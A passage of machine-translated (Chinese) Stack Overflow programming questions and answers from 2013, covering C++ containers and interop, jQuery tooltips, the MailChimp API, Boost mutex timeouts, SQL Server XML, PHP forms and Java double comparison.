我尝试过的事情：

*   `target="_blank"`：在新选项卡中打开，而不是弹出窗口
*   `<a onclick="window.open(...)">`: 被gmail删掉了。
*   `<a href="javascript:window.open(...)">`: 被gmail删掉了。
*   打开一个新选项卡，然后通过`onLoad`或类似方式从该选项卡生成一个弹出窗口：弹出窗口被阻止。

到目前为止，我发现的大多数与弹出窗口相关的在线资源都已经过时了，但经验法则似乎是“[如果一个事件是用户发起的，它将被允许打开一个弹出窗口](http://bytes.com/topic/javascript/answers/155463-how-get-around-popup-blockers)”。

即使是部分解决方案（仅适用于 Chrome/Firefox/Safari/etc）也总比没有好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:34:44.770

几乎所有邮件客户端都去掉了内联 JavaScript，因为它是恶意软件的载体。

您只能在电子邮件中包含常规链接。

# c++ - C ++：使用std :: function在multiset中插入元组，并保持顺序

> ID：15772761
> 
> 赞同：2
> 
> 时间：2013-04-02T19:33:04.993
> 
> 标签：c++, vector, insert, std-function, multiset

很简单，这段代码有什么问题？

```
 typedef std::function<double()>                             Event;
    typedef std::tuple <double, std::function<double()>>        Event_handle;

    std::multiset < Event_handle > event_multiset;
    std::vector < Event_handle > event_vector;
    void add_event_handler(double time, Event func_object)
    {
        // multiset version gives an error 
        // event_multiset.insert (std::make_tuple(time, func_object));
        // vector is ok
        event_vector.push_back(std::make_tuple(time, func_object));
    } 
```

`g++ 4.7.2`简单地使用 - with 命令编译`g++ -std=c++11 main.cpp`

**我为什么要这样做？**

程序是实时运行的，`add_even_handler`函数中包含一个类型`double`为 called的值`time`（注意`time`这里的变量与时钟或实际时间无关，它只是一个 double 类型的递增对象）。因此，当用户添加一些事件时，它将在某个时间被调用。

标准下的多集容器将按某种顺序整理对象（通常，如果不总是，`std::less<T>`）。然后循环遍历容器，我可以`Event`在不断增加的变量变化时调用`double time`。

**问题是什么？**

正如 KyleC 所指出的（见他的回答），`std::function<>`编译器不理解在​​什么过程中订购

**我是如何克服这个问题的**

你每天学习新的东西。上面的代码是最初混合`std::multiset`和`std::tuple`. `std::map<T,S>`or`std::multimap<T,S>`也按关联的排序`key`，在这种情况下是 type `double`，默认情况下它也是`std::less<T>`。所以代替上面的，我做了类似下面的事情

```
std::multimap <double, event> event_map;
void add_event_handler(double time, Event func_object)
{
    // multimap is ok
    event_map.insert(std::make_pair(time,func_object));
} 
```

这只是写在这里，以防它可能对人们有所帮助，尽管很明显但仍然如此。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:46:18.920

问题是多重集是有序的。

你得到的错误是：

```
Error   1   error C2678: binary '<' : no operator found which takes a left-hand operand of type 'const std::function<_Fty>' (or there is no acceptable conversion)  
error C2088: '<' : illegal for class    C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\include\tuple    52 
```

多重集不知道如何处理这个问题，因为它不知道如何对多重集进行排序。

> 在内部，多重集容器保持其所有元素按照其比较对象指定的标准进行排序。元素始终按照此顺序插入到其各自的位置。

使用向量有什么问题？

-- 根据您的评论，我认为地图会很好地满足您的目的。

```
std::map < float, Event > event_map;
event_map.insert(std::make_pair(time, func_object)); 
```

# php - JQUERY 工具提示 - 样式化特定单词

> ID：15772762
> 
> 赞同：0
> 
> 时间：2013-04-02T19:33:11.573
> 
> 标签：php, jquery, css, styles

我有这个jQuery：

```
this.tooltip = function(){  
    /* CONFIG */        
        xOffset = 10;
        yOffset = 20;       
        // these 2 variable determine popup's distance from the cursor
        // you might want to adjust to get the right result     
    /* END CONFIG */        
    $("a.tooltip").hover(function(e){                                             
        this.t = this.title;
        this.title = "";                                      
        $("body").append("<p id='tooltip'>"+ this.t +"</p>");
        $("#tooltip")
            .css("top",(e.pageY - xOffset) + "px")
            .css("left",(e.pageX + yOffset) + "px")
            .fadeIn("fast");        
    },
    function(){
        this.title = this.t;        
        $("#tooltip").remove();
    }); 
    $("a.tooltip").mousemove(function(e){
        $("#tooltip")
            .css("top",(e.pageY - xOffset) + "px")
            .css("left",(e.pageX + yOffset) + "px");
    });         
};

// starting the script on page load
$(document).ready(function(){
    tooltip();
}); 
```

它与一个名为“工具提示”的 CSS 类一起使用`font-variant:small-caps;`。

所有工具提示都采用小型大写字母，看起来很棒:)

工具提示是这样调用的： `<a href="#" class="tooltip" title="this is the tooltip">hover to see tooltip</a>`

我想在工具提示中包含一两个单词 BOLD 和全部小写。我怎样才能在不打乱工具提示的重置的情况下做到这一点？

因此，而不是显示为：

这是工具提示

我想要 ：

这是工具提示

有任何想法吗 ？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:40:47.007

您可以将某个类添加到您正在添加的文本中，然后通过 CSS 设置它的样式。例如

```
$("a.tooltip").hover(function(e){                                             
        this.t = this.title;
        this.title = "";                                      
        $("body").append("<p id='tooltip' class='tooltipText'>"+ this.t +"</p>");
        $("#tooltip")
            .css("top",(e.pageY - xOffset) + "px")
            .css("left",(e.pageX + yOffset) + "px")
            .fadeIn("fast");        
    }, 
```

然后是CSS：

```
.tooltipText
{
   text-transform: uppercase;
   /* any style you want  */

} 
```

# mailchimp - Mailchimp 的一个列表，两个不同的感谢页面

> ID：15772763
> 
> 赞同：4
> 
> 时间：2013-04-02T19:33:15.210
> 
> 标签：mailchimp

Mailchimp 将每个表单与一个列表联系起来。

我想在 Page1.html 上有一个注册表单，将用户发送到 Page1ty.html，在 Page2.html 上有另一个表单，将用户发送到 Page2ty.html。但是两种形式都需要将用户输入到同一个列表中。如上所述，使用它们的基本形式是不可能的。我需要两个清单。

Mailchimp 说这种路由可能使用他们的 API 是可能的。有谁知道如何完成上述类型的注册？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-03T15:03:43.597

您只需创建自定义表单并绑定到 MailChimp API，但在他们的最新更新中，您需要确保您拥有管理员权限。

您从他们的[API 下载](http://apidocs.mailchimp.com/api/1.3/)中包含（需要）`MCAPI.class.php`和文件，然后编写您的流程（我使用）。`config.inc.php``PHP`

下载文件并使用正确的凭据（API 密钥和列表 ID）设置“config.inc.php”文件后，您就可以开始使用了。

这是一个为用户订阅列表的示例`PHP`，但您必须阅读 API 文档才能获得您正在寻找的确切功能。

```
<?php
session_start();

// ---  Sample fields - depends on your list
$mailChimpTIME = date('Y-m-d H:i:s');
$mailChimpFirstName = // First Name
$mailChimpLastName = // Last Name
$mailChimpEmailAddress = // Email Address

require_once 'MCAPI.class.php';
require_once 'config.inc.php'; //contains apikey

$api = new MCAPI($apikey);

$merge_vars = array(
'FNAME'=>$mailChimpFirstName, 
'LNAME'=>$mailChimpLastName, 
'EMAIL'=>$mailChimpEmailAddress,
'OPTIN_IP'=>$_SERVER['REMOTE_ADDR'], 
'OPTIN_TIME'=>$mailChimpTIME
);

$email_type = 'html';
$double_optin = true;
$update_existing = true;
$replace_interests = false;

// By default this sends a confirmation email - you will not see new members
// until the link contained in it is clicked!
$retval = $api->listSubscribe( $listId, $mailChimpEmailAddress, $merge_vars, $email_type, $double_optin, $update_existing, $replace_interests);

if ($api->errorCode){
    echo "Unable to load listSubscribe()!\n";
    echo "\tCode=".$api->errorCode."\n";
    echo "\tMsg=".$api->errorMessage."\n";
} else {
    // Success
    //echo "Subscribed - look for the confirmation email!\n";
}
?> 
```

# c++ - 如何从非托管 C++ 调用托管 C++ 方法

> ID：15772765
> 
> 赞同：5
> 
> 时间：2013-04-02T19:33:16.640
> 
> 标签：c++, com, interop, unmanaged, managed-c++

## 请参阅下面的更新

## （已解决）此外，我已将其扩展为第二个问题[在非托管 C++ 程序中实现 C# DLL COM 文件](https://stackoverflow.com/questions/15793668/implement-a-c-sharp-dll-com-file-in-unmanaged-c-program)

我已经研究到互联网的尽头，但没有找到一个真实的、可理解的、人类的例子来说明如何做到这一点。

我有一个加密和解密文本的 C# DLL。

我不想/不具备用 C++ 非托管代码重写它的智力能力。因此，我创建了一个与 C# dll 接口的 C++/CLR 类。

现在我需要知道如何从我的非托管代码中调用托管 C++。

这是我的托管代码，并且已验证它可以正常工作

```
// clrTest.cpp : main project file.

#include "cSharpRiJHarn"
#include "stdafx.h"
#include <string>
#include <stdio.h>

using namespace cSharpRiJHarn;
using namespace System;

String^ Encrypt(String ^s)
{
    return  RijndaelLink::encrypt(s);   
}

String^ Decrypt(String ^s)
{
    return  RijndaelLink::decrpyt(s);   
}

int main()
{   
     //Console::WriteLine(Encrypt("It Works"));

     //Console::WriteLine(Decrypt(Encrypt("It Works")));

     //Console::ReadLine();
     return 0;
} 
```

现在我又一次研究了这个。

我已经看到了所有不好/过于复杂的解释

我知道我需要使用一种叫做 COM 或 Interop 的东西

我不知道这是如何工作的，我只是在寻找一个非常简单的解释。

谢谢您的帮助。

## 更新

我已将 C# DLL 转换为 COM 文件

```
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace cSharpRiJHarn
{
    [Guid("GuiD CODE REMOVED")]
    public interface DBCOM_Interface
    {
        [DispId(1)]
        String encrypt(string s);
        [DispId(2)]
        String decrpyt(string s);
    }

    [Guid("GuiD CODE REMOVED"),
    InterfaceType(ComInterfaceType.InterfaceIsIDispatch)]
    public interface DBCOM_Events
    {
    }

    [Guid("GuiD CODE REMOVED"),
    ClassInterface(ClassInterfaceType.None),
    ComSourceInterfaces(typeof(DBCOM_Events))]
    public class RijndaelLink : DBCOM_Interface
    {
        public String encrypt(String s)
        {
            return Rijndael.EncryptString(s); 
        }
        public String decrpyt(String s)
        {
            return Rijndael.DecryptString(s);
        }
    }
} 
```

现在我只需要知道如何在非托管 C++ 中实现它......我已经尝试将文件添加到 C++ 项目中，并将整个 cSharpRiJHarn 项目添加到这个解决方案中。都不工作。

```
#import "cSharpRiJHarn" 
#include "stdafx.h"
#include <string>
#include <stdio.h>
#include <iostream>
//using namespace cSharpRiJHarn;

int main(){

    cSharpRiJHarn::RijndaelLink::encrypt("It works");
    char ch;
    std::cin>>ch;
    return 0;
} 
```

这是我遇到的错误之一。

> 错误 6 错误 C2653: 'cSharpRiJHarn' : 不是类或命名空间名称

和

> 错误 8 IntelliSense：无法打开源文件“C:/.../.../Documents/Visual Studio 2010/Projects/unmannagedCPPExample/unmannagedCPPExample/Debug/cSharpRiJHarn.tlh”c:......\documents\visual工作室 2010\projects\unmannagedcppexample\unmannagedcppexample\unmannagedcppexample.cpp

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T21:32:14.103

您可以使用Microsoft 提供的酷炫的[C++ Marshaling 库，如下所示：](http://msdn.microsoft.com/en-us/library/bb384865%28v=vs.100%29.aspx)

```
#include "cSharpRiJHarn"
#include "stdafx.h"
#include <string>
#include <stdio.h>
#include "msclr\marshal_cppstd.h" // marshaling library

using namespace cSharpRiJHarn;
using namespace System;
using namespace msclr::interop; // marshaling library

std::wstring Encrypt(std::wstring s)
{
    return marshal_as<std::wstring>(RijndaelLink::encrypt(marshal_as<String^>(s)));
}

std::wstring Decrypt(std::wstring s)
{
    return marshal_as<std::wstring>(RijndaelLink::decrypt(marshal_as<String^>(s)));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T20:04:03.830

首先，您的方法接收并返回`String^`一个托管对象。非托管代码不知道这种类型，也不能创建这样的对象。因此，您需要包装函数调用，以便函数将托管类型编组为非托管代码可以理解的内容。

之后，您可以将 DllExport 属性添加到托管方法，如此[处](https://stackoverflow.com/questions/225277/calling-managed-code-from-unmanaged-code)所述。

# r - R字符转换

> ID：15772766
> 
> 赞同：1
> 
> 时间：2013-04-02T19:33:20.290
> 
> 标签：r

从导入中，我有一个日期被读取为一个因素：

```
user$registrationDate[1]
[1] "2004-07-23 14:19:32"
15551 Levels:  " "1" "2004-07-23 14:19:32" "2004-07-25 03:29:18" "2004-07-25 08:35:20" ... i10yo." 
```

我显然成功地将其转换为字符向量

```
as.character(user$registrationDate[1])
[1] "\"2004-07-23 14:19:32\"" 
```

无论我试图剥离前导引号和尾随引号，我仍然会得到一个尾随引号（或类似的东西）

```
sub('"', "", as.character(user$registrationDate[10]), fixed=TRUE)
[1] "2004-09-12 22:39:21\"" 
```

我尝试了 sub 的许多变体并不断得到相同的结果。尖端？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:38:17.117

来自`?sub`：“sub 仅替换模式的第一次出现，而 gsub 替换所有出现”。所以`gsub`改用。

# c++ - 提升进程间互斥量并检查放弃

> ID：15772768
> 
> 赞同：7
> 
> 时间：2013-04-02T19:33:27.730
> 
> 标签：c++, windows, boost

我需要围绕一块硬件进行进程间同步。因为此代码需要在 Windows 和 Linux 上运行，所以我使用 Boost Interprocess 互斥锁进行包装。一切正常，接受我检查放弃互斥锁的方法。这有可能发生，所以我必须为此做好准备。

我在测试中放弃了互斥锁，果然，当我使用 scoped_lock 锁定互斥锁时，进程无限期地阻塞。我想解决这个问题的方法是在 scoped_lock 上使用超时机制（因为在谷歌上搜索解决这个问题的方法花费的时间并不多，由于可移植性的原因，boost 并没有做太多的事情）。

事不宜迟，这就是我所拥有的：

```
#include <boost/interprocess/sync/named_recursive_mutex.hpp>
#include <boost/interprocess/sync/scoped_lock.hpp>

typedef boost::interprocess::named_recursive_mutex MyMutex;
typedef boost::interprocess::scoped_lock<MyMutex> ScopedLock;

MyMutex* pGate = new MyMutex(boost::interprocess::open_or_create, "MutexName");

{
    // ScopedLock lock(*pGate); // this blocks indefinitely
    boost::posix_time::ptime timeout(boost::posix_time::microsec_clock::local_time() + boost::posix_time::seconds(10));
    ScopedLock lock(*pGate, timeout); // a 10 second timeout that returns immediately if the mutex is abandoned ?????
    if(!lock.owns()) {
        delete pGate;
        boost::interprocess::named_recursive_mutex::remove("MutexName");
        pGate = new MyMutex(boost::interprocess::open_or_create, "MutexName");
    }
} 
```

至少，这是一个想法。三个有趣的点：

*   当我**不**使用超时对象并放弃互斥锁时，ScopedLock ctor 会无限期地阻塞。这是预期的。
*   当我**确实使用**超时并且互斥锁被放弃时，ScopedLock ctor 立即返回并告诉我它不拥有互斥锁。好吧，也许这很正常，但为什么它不等我告诉它的 10 秒呢？
*   当互斥锁**没有被放弃**并且我使用超时时，ScopedLock ctor 仍然立即返回，告诉我它无法锁定或获取互斥锁的所有权，我完成了移除互斥锁并重新制作它的动作. 这根本不是我想要的。

那么，我在使用这些对象时缺少什么？也许它正盯着我的脸，但我看不到它，所以我正在寻求帮助。

我还应该提到，由于这个硬件的工作原理，如果进程不能在 10 秒内获得互斥锁的所有权，互斥锁就会被放弃。事实上，我可能只需要等待 50 或 60 毫秒，但 10 秒是一个不错的“圆形”数字。

我正在使用 Visual Studio 2010 在 Windows 7 上进行编译。

谢谢，安迪

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T20:07:02.963

> 当我不使用超时对象并放弃互斥锁时，ScopedLock ctor 会无限期地阻塞。这是预期的

如果 boost 支持健壮的互斥锁，则解决您的问题的最佳方法是。然而 Boost 当前不支持健壮的互斥锁。只有一个计划来模拟强大的互斥锁，因为只有 linux 对此有本机支持。仿真仍然只是由图书馆作者 Ion Gaztanaga 计划的。检查此链接，了解可能将 rubust 互斥体入侵到 boost 库中：http: [//boost.2283326.n4.nabble.com/boost-interprocess-gt-1-45-robust-mutexes-td3416151.html](http://boost.2283326.n4.nabble.com/boost-interprocess-gt-1-45-robust-mutexes-td3416151.html)

同时，您可能会尝试在共享段中使用原子变量。

另请查看此 stackoverflow 条目： [如何获得废弃的 boost::interprocess::interprocess_mutex 的所有权？](https://stackoverflow.com/questions/1179685/how-do-i-take-ownership-of-an-abandoned-boostinterprocessinterprocess-mutex/1179766#1179766)

> 当我确实使用超时并且互斥锁被放弃时，ScopedLock ctor 立即返回并告诉我它不拥有互斥锁。好吧，也许这很正常，但为什么它不等我告诉它的 10 秒呢？

这很奇怪，你不应该得到这种行为。但是：定时锁可能是用try锁来实现的。检查此文档： http: [//www.boost.org/doc/libs/1_53_0/doc/html/boost/interprocess/scoped_lock.html#idp57421760-bb](http://www.boost.org/doc/libs/1_53_0/doc/html/boost/interprocess/scoped_lock.html#idp57421760-bb) 这意味着，定时锁的实现可能会在内部抛出异常并且然后返回假。

```
inline bool windows_mutex::timed_lock(const boost::posix_time::ptime &abs_time)
{
   sync_handles &handles =
      windows_intermodule_singleton<sync_handles>::get();
   //This can throw
   winapi_mutex_functions mut(handles.obtain_mutex(this->id_));
   return mut.timed_lock(abs_time);
} 
```

可能无法获得句柄，因为互斥体被放弃了。

> 当互斥锁没有被放弃并且我使用超时时，ScopedLock ctor 仍然立即返回，告诉我它无法锁定或获取互斥锁的所有权，我完成了移除互斥锁并重新制作它的动作. 这根本不是我想要的。

我不确定这个，但我认为命名互斥锁是通过使用共享内存实现的。如果您使用的是 Linux，请检查文件 /dev/shm/MutexName。在 Linux 中，文件描述符在未被关闭之前一直有效，无论您是否通过例如 boost::interprocess::named_recursive_mutex::remove 删除了文件本身。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-07-09T07:12:13.473

查看**BOOST_INTERPROCESS_ENABLE_TIMEOUT_WHEN_LOCKING**和**BOOST_INTERPROCESS_TIMEOUT_WHEN_LOCKING_DURATION_MS**编译标志。在代码中定义第一个符号以强制进程间互斥体超时，第二个符号定义超时持续时间。

我帮助将它们添加到库中以解决废弃的互斥锁问题。由于许多依赖于简单互斥而不是定时互斥的进程间构造（如 message_queue），因此有必要添加它。将来可能会有更强大的解决方案，但这个解决方案已经很好地满足了我的进程间需求。

很抱歉，我目前无法为您的代码提供帮助；那里有些东西不能正常工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-11T18:48:34.773

**BOOST_INTERPROCESS_ENABLE_TIMEOUT_WHEN_LOCKING**不太好。它引发异常并且没有太大帮助。为了解决异常行为，我编写了这个宏。对于通用目的，它可以正常工作。在此示例中，使用了 named_mutex。该宏创建一个具有超时的作用域锁，如果由于特殊原因无法获取锁，它将在之后解锁它。这样程序可以稍后再次锁定它并且不会立即冻结或崩溃。

```
#define TIMEOUT 1000
#define SAFELOCK(pMutex) \
    boost::posix_time::ptime wait_time \
        = boost::posix_time::microsec_clock::universal_time() \
        + boost::posix_time::milliseconds(TIMEOUT); \
    boost::interprocess::scoped_lock<boost::interprocess::named_mutex> lock(*pMutex, wait_time); \
    if(!lock.owns()) { \
        pMutex->unlock(); } 
```

但即使这样也不是最优的，因为要锁定的代码现在运行一次解锁。这可能会导致问题。但是，您可以轻松扩展宏。例如，仅当 lock.owns() 为真时才运行代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-12-05T08:28:49.827

boost::interprocess::named_mutex 有3个定义：在windows上，你可以使用宏来使用windows mutex而不是boost mutex，你可以尝试捕获被遗弃的异常，你应该解锁它！

在 linux 上，boost 有 pthread_mutex，但它在 1_65_1version 中不是健壮的属性

所以我自己使用系统API（windows Mutex和linux pthread_mutex进程共享模式）实现了interprocess_mutex，但是windows Mutex在内核而不是文件中。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-05-25T23:14:22.783

克雷格格雷厄姆已经在回复中回答了这个问题，但我想我会详细说明，因为我发现了这个，没有阅读他的信息，而是用我的头来解决这个问题。

在 POSIX 系统上，定时锁调用：

```
timespec ts = ptime_to_timespec(abs_time);
pthread_mutex_timedlock(&m_mut, &ts) 
```

用户传递到 interprocess`abs_time`的 是哪里。`ptime``timed_lock`

问题是，它`abs_time`必须是 UTC，而不是系统时间。假设您要等待 10 秒；如果您领先于 UTC，您`timed_lock()`将立即返回，如果您落后于 UTC，您`timed_lock()`将在`hours_behind - 10`几秒钟内返回。

以下`ptime`在 10 秒内使进程间互斥体超时：

```
boost::posix_time::ptime now = boost::posix_time::second_clock::universal_time() +
                               boost::posix_time::seconds(10); 
```

如果我使用`::local_time()`而不是`::universal_time()`，因为我领先于 UTC，它会立即返回。文档没有提到这一点。

我还没有尝试过，但是稍微深入研究一下代码，看起来在非 POSIX 系统上也会出现同样的问题。

如果`BOOST_INTERPROCESS_POSIX_TIMEOUTS`未定义，`ipcdetail::try_based_timed_lock(*this, abs_time)`则调用该函数。它也使用通用时间，等待`while(microsec_clock::universal_time() < abs_time)`。

这只是猜测，因为我无法快速访问 Windows 系统来测试它。

有关完整详细信息，请参阅[https://www.boost.org/doc/libs/1_76_0/boost/interprocess/sync/detail/common_algorithms.hpp](https://www.boost.org/doc/libs/1_76_0/boost/interprocess/sync/detail/common_algorithms.hpp)

# sql - SQL Server - 基于连接替换 XML 变量中的文本

> ID：15772777
> 
> 赞同：2
> 
> 时间：2013-04-02T19:33:57.283
> 
> 标签：sql, xml, sql-server-2008

对于我的情况，我有与以下类似的 XML：

```
DECLARE @MyXML XML

SET @MyXML = 
  '
  <Students>
    <Student>
      <Nickname>Cat</Nickname>
      <Name>Catherine</Name>
    </Student>
    <Student>
      <Nickname>Cat</Nickname>
      <Name>Joseph</Name>
    </Student>
  </Students>
  '

SELECT  T.Students.value('Nickname[1]', 'varchar(20)')
FROM    @MyXML.nodes('/Students/Student[Nickname = "Cat"]') T(Students)
JOIN    dbo.MyStudents CLASS ON T.Students.value('Name[1]', 'varchar(20)') = CLASS.StudentName 
```

我想更新从此 SELECT 语句返回的记录，用 CLEARED 替换昵称。因此，如果 dbo.MyStudents 有 Joseph 但没有 Catherine，则生成的 @MyXML 变量将是：

```
 <Students>
    <Student>
      <Nickname>Cat</Nickname>
      <Name>Catherine</Name>
    </Student>
    <Student>
      <Nickname>CLEARED</Nickname>
      <Name>Joseph</Name>
    </Student>
  </Students> 
```

有没有办法通过直接修改 XML 变量来做到这一点？或者我是否需要将 XML 变量放入临时表并在临时表上执行 .modify？

到目前为止，我发现的示例没有基于连接的 .modify 条件更新。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T20:09:41.237

试试这个例子。有关详细信息，请参阅[FOR XML 子句的语法](http://msdn.microsoft.com/en-us/library/ms190922.aspx)。

```
-- sample @MyStudents table
declare @MyStudents table (StudentName varchar(90), NickName varchar(90));
insert @MyStudents values('Kent', '');
insert @MyStudents values('Robert', 'Bobby');
insert @MyStudents values('Lisa', 'LB');
insert @MyStudents values('Venkat', 'Big Cat');
insert @MyStudents values('Catherine', 'Cat');
insert @MyStudents values('Joseph', 'Joey');

DECLARE @MyXML XML
SET @MyXML = 
  '<Students>
    <Student>
      <Nickname>Cat</Nickname>
      <Name>Catherine</Name>
    </Student>
    <Student>
      <Nickname>Joey</Nickname>
      <Name>Joseph</Name>
    </Student>
    <Student>
      <Nickname>Bonzo</Nickname>
      <Name>Clifford</Name>
    </Student>
  </Students>'

select @MyXML = (
    select ( 
        select * from (
            -- set existing @MyStudent records to CLEARED
            select 
                'CLEARED' as NickName,
                T.Students.value('Name[1]', 'varchar(20)') as Name
            from @MyXML.nodes('/Students/Student') T(Students)
            join @MyStudents CLASS ON T.Students.value('Name[1]', 'varchar(20)') = CLASS.StudentName
            union
            -- get students that aren't in @MyStudents table
            select 
                T.Students.value('Nickname[1]', 'varchar(20)') as NickName,
                T.Students.value('Name[1]', 'varchar(20)') as Name
            from @MyXML.nodes('/Students/Student') T(Students)
            where not exists(select 1 from @MyStudents s where s.StudentName = T.Students.value('Name[1]', 'varchar(20)'))
    ) as t1
    for xml path('Student'), type)
for xml path('Students'), type) 
```

# c# - 将 C# MVC 应用程序连接到远程 SQL Server 数据库

> ID：15772779
> 
> 赞同：4
> 
> 时间：2013-04-02T19:34:02.240
> 
> 标签：c#, sql-server, asp.net-mvc, asp.net-mvc-3, database-connection

我有一个位于`http://192.168.10.3/MyDB`. 我已经创建了一个 C# MVC 应用程序，我需要知道将我的应用程序连接到上述数据库的步骤。

它只是替换`web.config`文件中的连接字符串吗？

```
Data Source=?? ;Initial Catalog=??;Integrated Security=SSPI;
User ID=??;Password=pwd; 
```

如果是这样，我应该在我放置`??`标志的地方替换什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T19:37:36.397

*   数据源 = 192.168.10.3
*   初始目录 = MyDB
*   用户 ID = 您用于访问 SQL Server 的任何 sql 登录名
*   密码=上面sql登录的密码

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T22:17:20.113

这里的其他答案很好。此外，ConnectionStrings.com 可以成为您的朋友，特别是如果您将来要连接到各种类型的数据库。选择您需要连接的数据库，然后您将看到可用于该数据库的不同连接字符串。

[http://connectionstrings.com/sql-server-2012#sqlconnection](http://connectionstrings.com/sql-server-2012#sqlconnection)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T19:45:13.727

你可以试试这个

1.  在您的桌面上创建一个新的文本文档 - conn.txt
2.  将文件扩展名更改为 udl (conn.udl)
3.  双击打开文件，在第一个选项卡中选择合适的提供者 4．在第二个选项卡中输入服务器名称（IP 地址、端口）、用户名、密码（选中允许保存密码）和数据库名称。
4.  测试连接
5.  如果测试报告成功关闭窗口。
6.  用记事本打开文件，复制除提供者名称以外的所有内容并将其粘贴回 connectionString

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-01-13T06:47:04.770

以下是您需要的连接字符串：

数据源=“192.168.10.3”；初始目录=MyDb；集成安全=SSPI；用户 ID=sa（例如）；密码=您之前设置的任何内容；

# php - PHP：2个表格，1个文件上传

> ID：15772780
> 
> 赞同：0
> 
> 时间：2013-04-02T19:34:05.520
> 
> 标签：php, html, file, upload

我有一个个人资料页面，我想在其上上传照片作为单独的操作。我有第一个表单成功提交到页面，当我提交照片表单时，页面返回空白并显示空消息。

HTML

```
<form method="post" action="profile.php" id="main">
  <input name="txtFirstName" type="text" value="<?php echo $sFirstName; ?>">
  <input type="submit" name="btnSubmit" value="Submit" />
</form>

<form method="post" action="profile.php" id="photo_upload" enctype="multipart/form-data">
  <img src="<?php echo($sPath); ?>" height='100' width='100' id="imgProfile" />
  <br>
  <input type="file" name="fUpload" id="fUpload">
  <br>
  <input type="submit" name="btnUploadPhoto" value="Upload" class="cancel"/>
</form> 
```

PHP

```
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  if ($_POST['btnSubmit']) {
    $sFirstName = $_POST['txtFirstName'];
  }
  else if ($_POST['btnUploadPhoto']) {
    // DO MY MOVE LOGIC
  }
} 
```

当调用“btnSubmit”时，页面加载并且文本框获取输入的名称。当调用“btnUploadPhoto”时，我在屏幕上得到了这个，没有别的：

{错误：''，味精：''}

如何让页面重新加载原始表单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:41:13.897

在上传文件时，您需要检查是否已在 PHP 代码中提交了文件。这是执行此操作的代码：

```
isset($_FILES['fUpload']) 
```

# c# - JuiceUI 不能与禁用的 ScriptManager AjaxFrameworkMode 一起使用

> ID：15772782
> 
> 赞同：0
> 
> 时间：2013-04-02T19:34:13.250
> 
> 标签：c#, asp.net, webforms, scriptmanager, juice-ui

我在我的项目中使用[JuiceUI](http://juiceui.com/)库，我发现它的组件`AjaxFrameworkMode=Disabled`在`ScriptManager`. **我的问题是，为什么？**有人告诉我，我希望在较新的项目中禁用此属性（阅读 asp.net 4.5）。虽然，我不知道为什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T20:28:20.577

你可以试试[Brew](http://shellscape.org/#brew)，可能会解决问题。它是 Juice UI 的近亲。

# java - 比较数组中的双精度并返回索引号

> ID：15772786
> 
> 赞同：0
> 
> 时间：2013-04-02T19:34:28.133
> 
> 标签：java, arrays, double, equality

```
public int index(double dest){
    int index = 0;
        for(int i=0; i<coords.length; i++){
            if((dest-coords[i])<1 && (dest-coords[i])>-1){
                index = i;
            }
        }
        return index;
    } 
```

基本上，我有一个双打数组“坐标”。我想写一个方法 index(double dest) 输入一个双精度，找到数组中的哪个索引包含这个双精度并返回索引整数。

在测试时，我 100% 确定我的输入 double 存在于数组中并且在数值上相等。但是，当我运行该方法时，它总是返回 0，或者声明 int 索引的值，似乎 for 循环根本没有运行。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:39:41.747

由于浮点数（float，double）的表示，基本上你不应该在不使用增量的情况下比较它们，或者请使用 BigDecimal 并从数字的字符串表示构造这些类的实例。

```
double number1 = 0.11234;
double number2 = 0.11234;
double delta = 0.01;
boolean areEqual = Math.abs(number1 - number2) <= delta; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:40:07.643

```
public int index(double destination){
int index = 0;
    for(int i=0; i<coords.length; i++){
        if((dest-coordsX[i])<1 && (destX-coordsX[i])>-1){
            index = i; // This gets overwritten as there is no break statement
            break; // Break out of the loop, the first time this becomes true
        }
    }
    return index;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:38:41.690

为什么不直接将数组值与输入进行比较？

```
if (dest == coords[i]) { //... 
```

但是第二个问题是初始化`index`为 0。在这种情况下，返回值`0`可能意味着它在索引位置找到，`0`或者它可能意味着它根本没有找到。`-1`如果根本找不到，通常会返回。如果在数组中找不到值，则尝试初始化`index`为`-1`so会返回。`-1`

如果数组中的值不是不同的，那么您将不会返回匹配的第一个索引，它将是最后一个索引。找到匹配项后，将 a`break`放在`if`匹配项中以跳出`for`循环。

此外，比较浮点数会带来自己的混乱：请阅读[http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm](http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm)

# java - 控制台输出到 WindowBuilder GUI

> ID：15772787
> 
> 赞同：0
> 
> 时间：2013-04-02T19:34:31.403
> 
> 标签：java, eclipse, swing, windowbuilder

我目前有一个程序，可以在不同行的“System.out.println()”语句中将文本行打印到屏幕上。我是 Java、Eclipse 和 WindowBuilder 的新手。

